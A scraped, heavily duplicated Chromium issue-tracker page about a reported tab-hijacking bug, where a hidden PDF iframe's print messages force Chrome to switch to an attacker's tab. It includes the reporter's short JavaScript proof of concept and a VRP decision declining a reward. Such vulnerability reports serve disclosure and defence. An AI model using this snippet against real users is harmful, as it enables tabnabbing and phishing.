        Hello, thank you for the report. Based on this report, however, this does not appear to be any user harm that can be introduced by this issue and what type of exploitation scenario this sort of issue would be useful in. This appears to be more of a functional issue rather than a security one. As such, we unfortunately must decline a VRP reward for this report.<span class="line"><!---->Hello, thank you for the report. Based on this report, however, this does not appear to be any user harm that can be introduced by this issue and what type of exploitation scenario this sort of issue would be useful in. This appears to be more of a functional issue rather than a security one. As such, we unfortunately must decline a VRP reward for this report.<!----></span><mr-comment-content></mr-comment-content>

        </div>

        <mr-user-link></mr-user-link>

        <chops-timestamp title="Thu, Feb 9, 2023, 6:40 PM EST"></chops-timestamp>
        
      
        </div>
        
      <div role="heading" class="comment-header" aria-level="2">
        <div>
          <a class="comment-link" href="?id=1307087#c41">Comment 41<!----></a>

          
        by
        <mr-user-link></mr-user-link>
        on
        <chops-timestamp title="Thu, Feb 9, 2023, 6:40 PM EST"></chops-timestamp>
        
      
        </div>
        
      </div>
    
      
        
        
      
        Tab nabbing is an attack that can be used to harm users which COOP could have prevented this was used as motivation for adding the security feature <span class="line"><!---->Tab nabbing is an attack that can be used to harm users which COOP could have prevented this was used as motivation for adding the security feature <!----></span>https://chromestatus.com/feature/5432089535053824<a class="undefined" target="_blank" href="https://chromestatus.com/feature/5432089535053824"><!---->https://chromestatus.com/feature/5432089535053824<!----></a> "1) Cross-window attacks.  For example, a malicious document may open a victim document in a new window and later navigate the window to a look-alike document to trick the user."<span class="line"><!----> "1) Cross-window attacks.  For example, a malicious document may open a victim document in a new window and later navigate the window to a look-alike document to trick the user."<!----></span><br><br>It also helps other security issues need more user interaction. (even a popunder can be exploited in timing attacks)<span class="line"><!---->It also helps other security issues need more user interaction. (even a popunder can be exploited in timing attacks)<!----></span><mr-comment-content></mr-comment-content>
        
          
        <div>
          
        </div>
      <div class="comment-body">
        <mr-comment-content></mr-comment-content>
        <div>
          
        </div>
      </div>

            Target project:<label for="targetProjectInput">Target project:</label>
            
              <input id="targetProjectInput" aria-owns="chops-autocomplete-1" aria-autocomplete="both" aria-expanded="false" aria-haspopup="listbox" aria-activedescendant="">
              
      
        /*
         * Really specific class names are necessary because ShadowDOM
         * is disabled for this component.
         */
        .chops-autocomplete-container {
          position: relative;
        }
        .chops-autocomplete-container table {
          padding: 0;
          font-size: var(--chops-main-font-size);
          color: var(--chops-link-color);
          position: absolute;
          background: var(--chops-white);
          border: var(--chops-accessible-border);
          z-index: 999;
          box-shadow: 2px 3px 8px 0px hsla(0, 0%, 0%, 0.3);
          border-spacing: 0;
          border-collapse: collapse;
          /* In the case when the autocomplete extends the
           * height of the viewport, we want to make sure
           * there's spacing. */
          margin-bottom: 1em;
        }
        .chops-autocomplete-container tbody {
          display: block;
          min-width: 100px;
          max-height: 500px;
          overflow: auto;
        }
        .chops-autocomplete-container tr {
          cursor: pointer;
          transition: background 0.2s ease-in-out;
        }
        .chops-autocomplete-container tr[data-selected] {
          background: var(--chops-active-choice-bg);
          text-decoration: underline;
        }
        .chops-autocomplete-container td {
          padding: 0.25em 8px;
          white-space: nowrap;
        }
        .screenreader-hidden {
          clip: rect(1px, 1px, 1px, 1px);
          height: 1px;
          overflow: hidden;
          position: absolute;
          white-space: nowrap;
          width: 1px;
        }

            <div>
              <input id="targetProjectInput" aria-owns="chops-autocomplete-1" aria-autocomplete="both" aria-expanded="false" aria-haspopup="listbox" aria-activedescendant="">
              <mr-autocomplete vocabularyname="project" for="targetProjectInput" role="listbox" id="chops-autocomplete-1"><!---->
      <style>
        /*
         * Really specific class names are necessary because ShadowDOM
         * is disabled for this component.
         */
        .chops-autocomplete-container {
          position: relative;
        }
        .chops-autocomplete-container table {
          padding: 0;
          font-size: var(--chops-main-font-size);
          color: var(--chops-link-color);
          position: absolute;
          background: var(--chops-white);
          border: var(--chops-accessible-border);
          z-index: 999;
          box-shadow: 2px 3px 8px 0px hsla(0, 0%, 0%, 0.3);
          border-spacing: 0;
          border-collapse: collapse;
          /* In the case when the autocomplete extends the
           * height of the viewport, we want to make sure
           * there's spacing. */
          margin-bottom: 1em;
        }
        .chops-autocomplete-container tbody {
          display: block;
          min-width: 100px;
          max-height: 500px;
          overflow: auto;
        }
        .chops-autocomplete-container tr {
          cursor: pointer;
          transition: background 0.2s ease-in-out;
        }
        .chops-autocomplete-container tr[data-selected] {
          background: var(--chops-active-choice-bg);
          text-decoration: underline;
        }
        .chops-autocomplete-container td {
          padding: 0.25em 8px;
          white-space: nowrap;
        }
        .screenreader-hidden {
          clip: rect(1px, 1px, 1px, 1px);
          height: 1px;
          overflow: hidden;
          position: absolute;
          white-space: nowrap;
          width: 1px;
        }
      </style>
      <div class="chops-autocomplete-container">
        <span class="screenreader-hidden" aria-live="polite">
          
        </span>
        <table hidden="">
          <tbody>
            
          </tbody>
        </table>
      </div>
    <!----></mr-autocomplete>
            </div>

       Note: Avoiding 2-way data binding to futureproof this code
        for LitElement. 
      <input id="checkbox" type="checkbox">

    Send email<chops-checkbox checked="true">Send email</chops-checkbox>

        Email display settings<h2>Email display settings</h2>

        There is a setting<a href="/hosting/settings">setting</a> to control how
        your email address appears on comments and issues that you post.<p>There is a <a href="/hosting/settings">setting</a> to control how
        your email address appears on comments and issues that you post.</p>

        Project members will always see your full email address.  By
        default, other users who visit the site will see an
        abbreviated version of your email address.<p>Project members will always see your full email address.  By
        default, other users who visit the site will see an
        abbreviated version of your email address.</p>

        If you do not wish your email address to be shared, there
        are other ways to get
        involved<a href="http://www.chromium.org/getting-involved">get
        involved</a> in the community.  To report a problem when using
        the Chrome browser, you may use the "Report an issue..."  item
        on the "Help" menu.<p>If you do not wish your email address to be shared, there
        are other ways to <a href="http://www.chromium.org/getting-involved">get
        involved</a> in the community.  To report a problem when using
        the Chrome browser, you may use the "Report an issue..."  item
        on the "Help" menu.</p>


        
          
      
        <slot></slot>
      <button>
        <slot></slot>
      </button>
    
            Got it
          <chops-button>
            Got it
          </chops-button>
        <div class="edit-actions">
          <chops-button>
            Got it
          </chops-button>
        </div>
      <chops-dialog id="privacyDialog" forced="">
        <h2>Email display settings</h2>

        <p>There is a <a href="/hosting/settings">setting</a> to control how
        your email address appears on comments and issues that you post.</p>

        <p>Project members will always see your full email address.  By
        default, other users who visit the site will see an
        abbreviated version of your email address.</p>

        <p>If you do not wish your email address to be shared, there
        are other ways to <a href="http://www.chromium.org/getting-involved">get
        involved</a> in the community.  To report a problem when using
        the Chrome browser, you may use the "Report an issue..."  item
        on the "Help" menu.</p>


        <div class="edit-actions">
          <chops-button>
            Got it
          </chops-button>
        </div>
      </chops-dialog>

      
      
        
          <slot></slot>
        <div class="dialog-content">
          <slot></slot>
        </div>
      <dialog class="dialog" role="dialog">
        <div class="dialog-content">
          <slot></slot>
        </div>
      </dialog>
    
        This site hosts public issues in public projects<h2>This site hosts public issues in public projects</h2>

        Unlike our internal issue tracker, this site makes most
        issues public, unless the issue is labeled with a Restrict-View-*
        label, such as Restrict-View-Google.<p>Unlike our internal issue tracker, this site makes most
        issues public, unless the issue is labeled with a Restrict-View-*
        label, such as Restrict-View-Google.</p>

        Components are not used for permissions.  And, regardless of
        restriction labels, the issue reporter, owner,
        and Cc'd users may always view the issue.<p>Components are not used for permissions.  And, regardless of
        restriction labels, the issue reporter, owner,
        and Cc'd users may always view the issue.</p>

        

        
          
      
        <slot></slot>
      <button>
        <slot></slot>
      </button>
    
            Got it
          <chops-button>
            Got it
          </chops-button>
        <div class="edit-actions">
          <chops-button>
            Got it
          </chops-button>
        </div>
      <chops-dialog id="corpModeDialog" forced="">
        <h2>This site hosts public issues in public projects</h2>

        <p>Unlike our internal issue tracker, this site makes most
        issues public, unless the issue is labeled with a Restrict-View-*
        label, such as Restrict-View-Google.</p>

        <p>Components are not used for permissions.  And, regardless of
        restriction labels, the issue reporter, owner,
        and Cc'd users may always view the issue.</p>

        

        <div class="edit-actions">
          <chops-button>
            Got it
          </chops-button>
        </div>

        mr-issue-details {

          display: flex;

          justify-content: flex-start;
          flex-direction: column;
          margin: 0;
          box-sizing: border-box;
        }
        h3 {
          margin-top: 1em;
        }
        mr-description {
          margin-bottom: 1em;
        }
        mr-edit-issue {
          margin-top: 40px;
        }
      </style>

        I can't repro the outcome shown in the video on Linux.  Any chance this is Windows specific?<span class="line"><!---->I can't repro the outcome shown in the video on Linux.         Annoyingly, I can reproduce this in official Chrome release on Linux using the sample in <span class="line"><!---->Annoyingly, I can reproduce this in official Chrome release on Linux using the sample in <!----></span>comment 9<a class="undefined" target="_blank" href="#c9"><!---->comment 9<!----></a>. Prebuilt Chromium binaries from <span class="line"><!---->. Prebuilt Chromium binaries from <!----></span>https://commondatastorage.googleapis.com/chromium-browser-snapshots/index.html<a class="undefined" target="_blank" href="https://commondatastorage.googleapis.com/chromium-browser-snapshots/index.html"><!---->https://commondatastorage.googleapis.com/chromium-browser-snapshots/index.html<!----></a> also repro the issue. But my local Chromium builds, regardless of how I tweak the build flags, do not.<span class="line"><!----> also repro the issue. But my local Chromium builds, regardless of how I tweak the build flags, do not.<!----></span><mr-comment-content></mr-comment-content>

          Labels:<strong><!---->Labels:</strong>

      <div class="issue-diff">

          <strong><!---->Labels:</strong>

        Hello, thank you for the report. Based on this report, however, this does not appear to be any user harm that can be introduced by this issue and what type of exploitation scenario this sort of issue would be useful in. This appears to be more of a functional issue rather than a security one. As such, we unfortunately must decline a VRP reward for this report.<span class="line"><!---->Hello, thank you for the report. Based on this report, however, this does not appear to be any user harm that can be introduced by this issue and what type of exploitation scenario this sort of issue would be useful in. This appears to be more of a functional issue rather than a security one. As such, we unfortunately must decline a VRP reward for this report.<!----></span><mr-comment-content></mr-comment-content>
        
          
        <div>
          
        </div>

        <mr-comment-content></mr-comment-content>

        Tab nabbing is an attack that can be used to harm users which COOP could have prevented this was used as motivation for adding the security feature <span class="line"><!---->Tab nabbing is an attack that can be used to harm users which COOP could have prevented this was used as motivation for adding the security feature <!----></span>https://chromestatus.com/feature/5432089535053824<a class="undefined" target="_blank" href="https://chromestatus.com/feature/5432089535053824"><!---->https://chromestatus.com/feature/5432089535053824<!----></a> "1) Cross-window attacks.  For example, a malicious document may open a victim document in a new window and later navigate the window to a look-alike document to trick the user."<span class="line"><!----> "1) Cross-window attacks.  For example, a malicious document may open a victim document in a new window and later navigate the window to a look-alike document to trick the user."<!----></span><br><br>It also helps other security issues need more user interaction. (even a popunder can be exploited in timing attacks)<span class="line"><!---->It also helps other security issues need more user interaction. (even a popunder can be exploited in timing attacks)<!----></span><mr-comment-content></mr-comment-content>

        </div>

      UserAgent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36<span class="line"><!---->UserAgent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36<!----></span><br><br>Steps to reproduce the problem:<span class="line"><!---->Steps to reproduce the problem:<!----></span><br>On the attacker origin do the following (no user interaction used):<span class="line"><!---->On the attacker origin do the following (no user interaction used):<!----></span><br><br>let f = document.createElement('iframe');<span class="line"><!---->let f = document.createElement('iframe');<!----></span><br>f.hidden = true;<span class="line"><!---->f.hidden = true;<!----></span><br>f.src = '<span class="line"><!---->f.src = '<!----></span>https://www.w3.org/WAI/ER/tests/xhtml/testfiles/resources/pdf/dummy.pdf';<a class="undefined" target="_blank" href="https://www.w3.org/WAI/ER/tests/xhtml/testfiles/resources/pdf/dummy.pdf';"><!---->https://www.w3.org/WAI/ER/tests/xhtml/testfiles/resources/pdf/dummy.pdf';<!----></a><br>document.body.appendChild(f);<span class="line"><!---->document.body.appendChild(f);<!----></span><br>setTimeout(_ => {<span class="line"><!---->setTimeout(_ =&gt; {<!----></span><br>f.contentWindow[0].postMessage({type: 'print'}, '*');<span class="line"><!---->f.contentWindow[0].postMessage({type: 'print'}, '*');<!----></span><br>f.contentWindow[0].postMessage({type: 'print'}, '*');<span class="line"><!---->f.contentWindow[0].postMessage({type: 'print'}, '*');<!----></span><br>setTimeout(location.reload(), 100);<span class="line"><!---->setTimeout(location.reload(), 100);<!----></span><br>}, 100);<span class="line"><!---->}, 100);<!----></span><br><br>What is the expected behavior?<span class="line"><!---->What is the expected behavior?<!----></span><br>For the tab not to change without user interaction.<span class="line"><!---->For the tab not to change without user interaction.<!----></span><br><br>What went wrong?<span class="line"><!---->What went wrong?<!----></span><br>Forced user to switched to the attackers tab.<span class="line"><!---->Forced user to switched to the attackers tab.<!----></span><br><br>This seems to violate part of the Cross-Origin-Opener-Policy as one of its uses is to prevent cross-origin navigation's<span class="line"><!---->This seems to violate part of the Cross-Origin-Opener-Policy as one of its uses is to prevent cross-origin navigation's<!----></span><br>But if an attacker can just change the tab to theirs it might not work that well.<span class="line"><!---->But if an attacker can just change the tab to theirs it might not work that well.<!----></span><br><br>Also tab under!<span class="line"><!---->Also tab under!<!----></span><br><br>Did this work before? N/A <span class="line"><!---->Did this work before? N/A <!----></span><br><br>Chrome version: 99.0.4844.74  Channel: stable<span class="line"><!---->Chrome version: 99.0.4844.74  Channel: stable<!----></span><br>OS Version: 10.0<span class="line"><!---->OS Version: 10.0<!----></span><mr-comment-content></mr-comment-content>

This is vestigial behavior from an early Print Preview<span class="line"><!---->switching. tab.<!----></span><br><br>Bug: 1307087<a class="strike-through" target="_blank" href="/p/chromium/issues/detail?id=1307087" title="Tab hijacking on COOP protected websites."><!---->Bug:         Hello, thank you for the report. Based on this report, however, this does not appear to be any user harm that can be introduced by this issue and what type of exploitation scenario this sort of issue would be useful in. This appears to be more of a functional issue rather than a security one. As such, we unfortunately must decline a VRP reward for this report.<span class="line"><!---->Hello, thank you for the report. Based on this report, however, this does not appear to be any user harm that can be introduced by this issue and what type of exploitation scenario this sort of issue would be useful in. This appears to be more of a functional issue rather than a security one. As such, we unfortunately must decline a VRP reward for this report.<!----></span><mr-comment-content></mr-comment-content>

        Tab nabbing is an attack that can be used to harm users which COOP could have prevented this was used as motivation for adding the security feature <span class="line"><!---->Tab nabbing is an attack that can be used to harm users which COOP could have prevented this was used as motivation for adding the security feature <!----></span>https://chromestatus.com/feature/5432089535053824<a class="undefined" target="_blank" href="https://chromestatus.com/feature/5432089535053824"><!---->https://chromestatus.com/feature/5432089535053824<!----></a> "1) Cross-window attacks.  For example, a malicious document may open a victim document in a new window and later navigate the window to a look-alike document to trick the user."<span class="line"><!----> "1) Cross-window attacks.  For example, a malicious document may open a victim document in a new window and later navigate the window to a look-alike document to trick the user."<!----></span><br><br>It also helps other security issues need more user interaction. (even a popunder can be exploited in timing attacks)<span class="line"><!---->It also helps other security issues need more user interaction. (even a popunder can be exploited in timing attacks)<!----></span><mr-comment-content></mr-comment-content>

      UserAgent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36<span class="line"><!---->UserAgent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36<!----></span><br><br>Steps to reproduce the problem:<span class="line"><!---->Steps to reproduce the problem:<!----></span><br>On the attacker origin do the following (no user interaction used):<span class="line"><!---->On the attacker origin do the following (no user interaction used):<!----></span><br><br>let f = document.createElement('iframe');<span class="line"><!---->let f = document.createElement('iframe');<!----></span><br>f.hidden = true;<span class="line"><!---->f.hidden = true;<!----></span><br>f.src = '<span class="line"><!---->f.src = '<!----></span>https://www.w3.org/WAI/ER/tests/xhtml/testfiles/resources/pdf/dummy.pdf';<a class="undefined" target="_blank" href="https://www.w3.org/WAI/ER/tests/xhtml/testfiles/resources/pdf/dummy.pdf';"><!---->https://www.w3.org/WAI/ER/tests/xhtml/testfiles/resources/pdf/dummy.pdf';<!----></a><br>document.body.appendChild(f);<span class="line"><!---->document.body.appendChild(f);<!----></span><br>setTimeout(_ => {<span class="line"><!---->setTimeout(_ =&gt; {<!----></span><br>f.contentWindow[0].postMessage({type: 'print'}, '*');<span class="line"><!---->f.contentWindow[0].postMessage({type: 'print'}, '*');<!----></span><br>f.contentWindow[0].postMessage({type: 'print'}, '*');<span class="line"><!---->f.contentWindow[0].postMessage({type: 'print'}, '*');<!----></span><br>setTimeout(location.reload(), 100);<span class="line"><!---->setTimeout(location.reload(), 100);<!----></span><br>}, 100);<span class="line"><!---->}, 100);<!----></span><br><br>What is the expected behavior?<span class="line"><!---->What is the expected behavior?<!----></span><br>For the tab not to change without user interaction.<span class="line"><!---->For the tab not to change without user interaction.<!----></span><br><br>What went wrong?<span class="line"><!---->What went wrong?<!----></span><br>Forced user to switched to the attackers tab.<span class="line"><!---->Forced user to switched to the attackers tab.<!----></span><br><br>This seems to violate part of the Cross-Origin-Opener-Policy as one of its uses is to prevent cross-origin navigation's<span class="line"><!---->This seems to violate part of the Cross-Origin-Opener-Policy as one of its uses is to prevent cross-origin navigation's<!----></span><br>But if an attacker can just change the tab to theirs it might not work that well.<span class="line"><!---->But if an attacker can just change the tab to theirs it might not work that well.<!----></span><br><br>Also tab under!<span class="line"><!---->Also tab under!<!----></span><br><br>Did this work before? N/A <span class="line"><!---->Did this work before?         As shown in the video the tab gets changed to the tab that runs the script unless a website has a PDF then it can also be abused to switch to that tab.<span class="line"><!---->As shown in the video the tab gets changed to the tab that runs the script unless a website has a PDF then it can also be abused to switch to that tab.<!----></span><br>This has been tested on chrome stable for windows 10<span class="line"><!---->This has been tested on chrome stable for windows 10<!----></span><mr-comment-content></mr-comment-content>

This is vestigial behavior from an early Print Preview<span class="line"><!---->switching.         Hello, thank you for the report. Based on this report, however, this does not appear to be any user harm that can be introduced by this issue and what type of exploitation scenario this sort of issue would be useful in. This appears to be more of a functional issue rather than a security one. As such, we unfortunately must decline a VRP reward for this report.<span class="line"><!---->Hello, thank you for the report. Based on this report, however, this does not appear to be any user harm that can be introduced by this issue and what type of exploitation scenario this sort of issue would be useful in. This appears to be more of a functional issue rather than a security one. As such, we unfortunately must decline a VRP reward for this report.<!----></span><mr-comment-content></mr-comment-content>

        Tab nabbing is an attack that can be used to harm users which COOP could have prevented this was used as motivation for adding the security feature <span class="line"><!---->Tab nabbing is an attack that can be used to harm users which COOP could have prevented this was used as motivation for adding the security feature <!----></span>https://chromestatus.com/feature/5432089535053824<a class="undefined" target="_blank" href="https://chromestatus.com/feature/5432089535053824"><!---->https://chromestatus.com/feature/5432089535053824<!----></a> "1) Cross-window attacks.  For example, a malicious document may open a victim document in a new window and later navigate the window to a look-alike document to trick the user."<span class="line"><!----> "1) Cross-window attacks.  For example, a malicious document may open a victim document in a new window and later navigate the window to a look-alike document to trick the user."<!----></span><br><br>It also helps other security issues need more user interaction. (even a popunder can be exploited in timing attacks)<span class="line"><!---->It also helps other security issues need more user interaction. (even a popunder can be exploited in timing attacks)<!----></span><mr-comment-content></mr-comment-content>
        
          
        <div>
          
        </div>
      <div class="comment-body">

{<!----></span><br>f.contentWindow[0].postMessage({type: 'print'}, '*');<span class="line"><!---->f.contentWindow[0].postMessage({type: 'print'}, '*');<!----></span><br>f.contentWindow[0].postMessage({type: 'print'}, '*');<span class="line"><!---->f.contentWindow[0].postMessage({type: 'print'}, '*');<!----></span><br>setTimeout(location.reload(), 100);<span class="line"><!---->setTimeout(location.reload(), 100);<!----></span><br>}, 100);<span class="line"><!---->}, 100);<!----></span><br><br>What is the expected behavior?<span class="line"><!---->What is the expected behavior?<!----></span><br>For the tab not to change without user interaction.<span class="line"><!---->For the tab not to change without user interaction.<!----></span><br><br>What went wrong?<span class="line"><!---->What went wrong?<!----></span><br>Forced user to switched to the attackers tab.<span class="line"><!---->Forced user to switched to the attackers tab.<!----></span><br><br>This seems to violate part of the Cross-Origin-Opener-Policy as one of its uses is to prevent cross-origin navigation's<span class="line"><!---->This seems to violate part of the Cross-Origin-Opener-Policy as one of its uses is to prevent cross-origin navigation's<!----></span><br>But if an attacker can just change the tab to theirs it might not work that well.<span class="line"><!---->But if an attacker can just change the tab to theirs it might not work that well.<!----></span><br><br>Also tab under!<span class="line"><!---->Also tab under!<!----></span><br><br>Did this work before?         Hello, thank you for the report. Based on this report, however, this does not appear to be any user harm that can be introduced by this issue and what type of exploitation scenario this sort of issue would be useful in. This appears to be more of a functional issue rather than a security one. As such, we unfortunately must decline a VRP reward for this report.<span class="line"><!---->Hello, thank you for the report. Based on this report, however, this does not appear to be any user harm that can be introduced by this issue and what type of exploitation scenario this sort of issue would be useful in. This appears to be more of a functional issue rather than a security one. As such, we unfortunately must decline a VRP reward for this report.<!----></span><mr-comment-content></mr-comment-content>

        Tab nabbing is an attack that can be used to harm users which COOP could have prevented this was used as motivation for adding the security feature <span class="line"><!---->Tab nabbing is an attack that can be used to harm users which COOP could have prevented this was used as motivation for adding the security feature <!----></span>https://chromestatus.com/feature/5432089535053824<a class="undefined" target="_blank" href="https://chromestatus.com/feature/5432089535053824"><!---->https://chromestatus.com/feature/5432089535053824<!----></a> "1) Cross-window attacks.  For example, a malicious document may open a victim document in a new window and later navigate the window to a look-alike document to trick the user."<span class="line"><!----> "1) Cross-window attacks. {<!----></span><br>f.contentWindow[0].postMessage({type: 'print'}, '*');<span class="line"><!---->f.contentWindow[0].postMessage({type: 'print'}, '*');<!----></span><br>f.contentWindow[0].postMessage({type: 'print'}, '*');<span class="line"><!---->f.contentWindow[0].postMessage({type: 'print'}, '*');<!----></span><br>setTimeout(location.reload(), 100);<span class="line"><!---->setTimeout(location.reload(), 100);<!----></span><br>}, 100);<span class="line"><!---->}, 100);<!----></span><br><br>What is the expected behavior?<span class="line"><!---->What is the expected behavior?<!----></span><br>For the tab not to change without user interaction.<span class="line"><!---->For the tab not to change without user interaction.<!----></span><br><br>What went wrong?<span class="line"><!---->What went wrong?<!----></span><br>Forced user to switched to the attackers tab.<span class="line"><!---->Forced user to switched to the attackers tab.<!----></span><br><br>This seems to violate part of the Cross-Origin-Opener-Policy as one of its uses is to prevent cross-origin navigation's<span class="line"><!---->This seems to violate part of the Cross-Origin-Opener-Policy as one of its uses is to prevent cross-origin navigation's<!----></span><br>But if an attacker can just change the tab to theirs it might not work that well.<span class="line"><!---->But if an attacker can just change the tab to theirs it might not work that well.<!----></span><br><br>Also tab under!<span class="line"><!---->Also tab under!<!----></span><br><br>Did this work before? N/A <span class="line"><!---->Did this work before? N/A <!----></span><br><br>Chrome version: 99.0.4844.74  Channel: stable<span class="line"><!---->Chrome version: 99.0.4844.74  Channel: stable<!----></span><br>OS Version: 10.0<span class="line"><!---->OS Version: 10.0<!----></span><mr-comment-content></mr-comment-content>

        Hello, thank you for the report. Based on this report, however, this does not appear to be any user harm that can be introduced by this issue and what type of exploitation scenario this sort of issue would be useful in. This appears to be more of a functional issue rather than a security one. As such, we unfortunately must decline a VRP reward for this report.<span class="line"><!---->Hello, thank you for the report. Based on this report, however, this does not appear to be any user harm that can be introduced by this issue and what type of exploitation scenario this sort of issue would be useful in. This appears to be more of a functional issue rather than a security one. As such, we unfortunately must decline a VRP reward for this report.<!----></span><mr-comment-content></mr-comment-content>

        Tab nabbing is an attack that can be used to harm users which COOP could have prevented this was used as motivation for adding the security feature <span class="line"><!---->Tab nabbing is an attack that can be used to harm users which COOP could have prevented this was used as motivation for adding the security feature <!----></span>https://chromestatus.com/feature/5432089535053824<a class="undefined" target="_blank" href="https://chromestatus.com/feature/5432089535053824"><!---->https://chromestatus.com/feature/5432089535053824<!----></a> "1) Cross-window attacks.  For example, a malicious document may open a victim document in a new window and later navigate the window to a look-alike document to trick the user."<span class="line"><!----> "1) Cross-window attacks.  For example, a malicious document may open a victim document in a new window and later navigate the window to a look-alike document to trick the user."<!----></span><br><br>It also helps other security issues need more user interaction. (even a popunder can be exploited in timing attacks)<span class="line"><!---->It also helps other security issues need more user interaction. (even a popunder can be exploited in timing attacks)<!----></span><mr-comment-content></mr-comment-content>

           issue<h3 class="medium-heading"><!----> issue</h3>
          
            Target project:<label for="targetProjectInput">Target project:</label>
            
              <input id="targetProjectInput" aria-owns="chops-autocomplete-1" aria-autocomplete="both" aria-expanded="false" aria-haspopup="listbox" aria-activedescendant="">
              
      
        /*
         * Really specific class names are necessary because ShadowDOM
         * is disabled for this component.
         */
        .chops-autocomplete-container {
          position: relative;
        }
        .chops-autocomplete-container table {
          padding: 0;
          font-size: var(--chops-main-font-size);
          color: var(--chops-link-color);
          position: absolute;
          background: var(--chops-white);
          border: var(--chops-accessible-border);
          z-index: 999;
          box-shadow: 2px 3px 8px 0px hsla(0, 0%, 0%, 0.3);
          border-spacing: 0;
          border-collapse: collapse;
          /* In the case when the autocomplete extends the
           * height of the viewport, we want to make sure
           * there's spacing. */
          margin-bottom: 1em;
        }
        .chops-autocomplete-container tbody {
          display: block;
          min-width: 100px;
          max-height: 500px;
          overflow: auto;
        }
        .chops-autocomplete-container tr {
          cursor: pointer;
          transition: background 0.2s ease-in-out;
        }
        .chops-autocomplete-container tr[data-selected] {
          background: var(--chops-active-choice-bg);
          text-decoration: underline;
        }
        .chops-autocomplete-container td {
          padding: 0.25em 8px;
          white-space: nowrap;
        }
        .screenreader-hidden {
          clip: rect(1px, 1px, 1px, 1px);
          height: 1px;
          overflow: hidden;
          position: absolute;
          white-space: nowrap;
          width: 1px;
        }

        <div class="target-project-dialog">

          <div class="input-grid">
            <label for="targetProjectInput">Target project:</label>
            <div>
              <input id="targetProjectInput" aria-owns="chops-autocomplete-1" aria-autocomplete="both" aria-expanded="false" aria-haspopup="listbox" aria-activedescendant="">
              <mr-autocomplete vocabularyname="project" for="targetProjectInput" role="listbox" id="chops-autocomplete-1"><!---->
      <style>
        /*
         * Really specific class names are necessary because ShadowDOM
         * is disabled for this component.
         */
        .chops-autocomplete-container {
          position: relative;
        }
        .chops-autocomplete-container table {
          padding: 0;
          font-size: var(--chops-main-font-size);
          color: var(--chops-link-color);
          position: absolute;
          background: var(--chops-white);
          border: var(--chops-accessible-border);
          z-index: 999;
          box-shadow: 2px 3px 8px 0px hsla(0, 0%, 0%, 0.3);
          border-spacing: 0;
          border-collapse: collapse;
          /* In the case when the autocomplete extends the
           * height of the viewport, we want to make sure
           * there's spacing. */
          margin-bottom: 1em;
        }
        .chops-autocomplete-container tbody {
          display: block;
          min-width: 100px;
          max-height: 500px;
          overflow: auto;
        }
        .chops-autocomplete-container tr {
          cursor: pointer;
          transition: background 0.2s ease-in-out;
        }
        .chops-autocomplete-container tr[data-selected] {
          background: var(--chops-active-choice-bg);
          text-decoration: underline;
        }
        .chops-autocomplete-container td {
          padding: 0.25em 8px;
          white-space: nowrap;
        }
        .screenreader-hidden {
          clip: rect(1px, 1px, 1px, 1px);
          height: 1px;
          overflow: hidden;
          position: absolute;
          white-space: nowrap;
          width: 1px;
        }
      </style>
      <div class="chops-autocomplete-container">
        <span class="screenreader-hidden" aria-live="polite">
          
        </span>
        <table hidden="">
          <tbody>
            
          </tbody>
        </table>
      </div>
    <!----></mr-autocomplete>
            </div>
          </div>

(function setupGoogleAnalytics() {
 ga('create', 'UA-55762617-14', {'siteSpeedSampleRate': 100});
})();

 runOnLoad(function() {
 if (typeof(ClientLogger) === "function") {
 let cl = new ClientLogger("issues");
 if (cl.started("new-issue")) {
 cl.logEnd("new-issue", null, 120 * 1000);
 }
 if (cl.started("issue-search")) {
 cl.logEnd("issue-search");
 }
 }
 });
<script type="text/javascript" nonce="">
 runOnLoad(function() {
 if (typeof(ClientLogger) === "function") {
 let cl = new ClientLogger("issues");
 if (cl.started("new-issue")) {
 cl.logEnd("new-issue", null, 120 * 1000);
 }
 if (cl.started("issue-search")) {
 cl.logEnd("issue-search");
 }
 }
 });
</script>
